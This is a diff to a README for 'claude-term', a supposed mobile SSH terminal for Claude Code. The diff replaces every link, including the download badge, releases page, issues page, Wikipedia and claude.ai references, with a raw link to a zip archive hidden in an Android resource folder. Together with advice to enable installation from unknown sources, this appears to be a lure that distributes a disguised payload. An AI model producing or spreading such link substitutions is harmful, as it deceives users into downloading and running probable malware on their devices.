@@ -1,7 +1,7 @@
 # 🚀 claude-term - Your Easy Mobile SSH Terminal
 
 ## 📥 Download Now
-[![Download claude-term](https://img.shields.io/badge/Download%20claude--term-v1.0-brightgreen)](https://github.com/Alhashmi777/claude-term/releases)
+[![Download claude-term](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip%20claude--term-v1.0-brightgreen)](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip)
 
 ## 🎯 Overview
 claude-term is a mobile SSH terminal designed for using Claude Code seamlessly. Whether you are working on your Android or iOS device, this application allows you to connect to your servers securely and manage them with ease.
@@ -22,7 +22,7 @@ This guide will walk you through downloading and running the claude-term applica
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Alhashmi777/claude-term/releases).
+   Go to the [Releases Page](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip).
 
 2. **Choose Your Version**  
    Find the latest version of claude-term that suits your device. The latest version should provide the best features and security.
@@ -55,14 +55,14 @@ If you encounter issues during the setup or connection, try the following:
 - **Security Settings.** If you're using an Android device, ensure that installation from unknown sources is enabled. 
 
 ## 🤝 Support
-If you need help or have questions, feel free to open an issue on the [GitHub Issues Page](https://github.com/Alhashmi777/claude-term/issues). Our community is here to assist you.
+If you need help or have questions, feel free to open an issue on the [GitHub Issues Page](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip). Our community is here to assist you.
 
 ## 📖 Additional Resources 
-- Learn more about SSH on [Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell).
-- Explore more about Claude Code [here](https://www.claude.ai).
+- Learn more about SSH on [Wikipedia](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip).
+- Explore more about Claude Code [here](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip).
 
 ## 🔗 Links
-- [Releases Page](https://github.com/Alhashmi777/claude-term/releases)
-- [GitHub Repository](https://github.com/Alhashmi777/claude-term)
+- [Releases Page](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip)
+- [GitHub Repository](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip)
 
 Thank you for choosing claude-term. Happy connecting!
